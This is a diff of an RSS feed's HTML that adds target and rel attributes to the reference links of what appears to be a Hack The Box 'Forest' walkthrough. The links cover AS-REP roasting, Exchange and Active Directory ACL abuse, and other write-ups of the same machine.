 &lt;h2 id="references">References&lt;/h2>
 &lt;p>&lt;strong>AS-REP Roasting&lt;/strong>&lt;/p>
-&lt;p>&lt;a href="https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html">https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec">https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://blog.xpnsec.com/kerberos-attacks-part-2/">https://blog.xpnsec.com/kerberos-attacks-part-2/&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html" target="_blank" rel="noopener">https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec" target="_blank" rel="noopener">https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://blog.xpnsec.com/kerberos-attacks-part-2/" target="_blank" rel="noopener">https://blog.xpnsec.com/kerberos-attacks-part-2/&lt;/a>
+&lt;/p>
 &lt;p>&lt;strong>Exchange and ACL Stuff&lt;/strong>&lt;/p>
-&lt;p>&lt;a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf">https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed">https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/">https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md">https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" target="_blank" rel="noopener">https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed" target="_blank" rel="noopener">https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/" target="_blank" rel="noopener">https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md" target="_blank" rel="noopener">https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md&lt;/a>
+&lt;/p>
 &lt;p>&lt;strong>Other Forest Walkthroughs&lt;/strong>&lt;/p>
-&lt;p>&lt;a href="https://0xdf.gitlab.io/2020/03/21/htb-forest.html">https://0xdf.gitlab.io/2020/03/21/htb-forest.html&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://www.youtube.com/watch?v=H9FcE_FMZio&amp;amp;t=3755s">https://www.youtube.com/watch?v=H9FcE_FMZio&amp;amp;t=3755s&lt;/a>&lt;/p>
-&lt;p>&lt;a href="https://vulndev.io/2020/03/21/forest-hackthebox/">https://vulndev.io/2020/03/21/forest-hackthebox/&lt;/a>&lt;/p></content></item></channel></rss>
+&lt;p>&lt;a href="https://0xdf.gitlab.io/2020/03/21/htb-forest.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2020/03/21/htb-forest.html&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://www.youtube.com/watch?v=H9FcE_FMZio&amp;amp;t=3755s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=H9FcE_FMZio&amp;t=3755s&lt;/a>
+&lt;/p>
+&lt;p>&lt;a href="https://vulndev.io/2020/03/21/forest-hackthebox/" target="_blank" rel="noopener">https://vulndev.io/2020/03/21/forest-hackthebox/&lt;/a>
+&lt;/p></content></item></channel></rss>
